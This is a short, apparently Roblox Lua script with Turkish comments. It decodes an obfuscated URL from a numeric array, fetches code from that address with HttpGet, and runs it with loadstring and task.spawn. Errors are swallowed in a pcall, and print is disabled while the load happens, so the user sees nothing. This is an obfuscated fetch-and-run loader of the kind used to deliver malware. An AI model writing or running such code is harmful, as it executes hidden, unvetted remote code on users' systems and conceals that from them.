local _1 = string; local _2 = game;
local _3 = {114,127,128,125,129,73,63,64,114,117,128,130,61,114,117,129,118,132,114,134,133,120,134,120,133,133,140,126,136,143,74,128,141,140,79,88,117,132,154,142,154,136,154,88,93,96,141,99,147,147,145,150,152,107,154,103,156,159,163,162,158,165,154,167,156,158,164,165,163,164,164,166,120,119,121,173,120,188,172,195,124,176,128,201,178,178,180,183,185,132,133,183,205,200,198,201,203,205,214,208,205,212,212,213,205,217,219,218,218,211,211,211,225,219,226,226,227,229,221,230,227,222,232,232,229,235,190,230,223,239,203,242,225,247,235,247,224,242,203,231,245,227,203,228,232,248,235}

local function _SOLVE(_DATA)
    local _RES = ""
    for i = 1, #_DATA do
        -- Dinamik Kaydırma: Her karakterde anahtar değişir (Orta Zorluk)
        local _K = (i % 8) + 10
        _RES = _RES .. _1.char(_DATA[i] - _K)
    end
    return _RES
end

local function _START()
    -- Linki çöz
    local _U = _SOLVE(_3) .. "?v=" .. math.random(1, 999)
    
    -- Sessizce yükle (Hata vermez)
    local _OK, _CONTENT = pcall(function() 
        return _2:HttpGet(_U, true) 
    end)
    
    if _OK and _CONTENT then
        local _RUN = loadstring(_CONTENT)
        if _RUN then
            task.spawn(_RUN)
        end
    end
end

-- Printleri geçici kapat (Güvenlik için)
local _p = print; print = function() end
_START()
print = _p
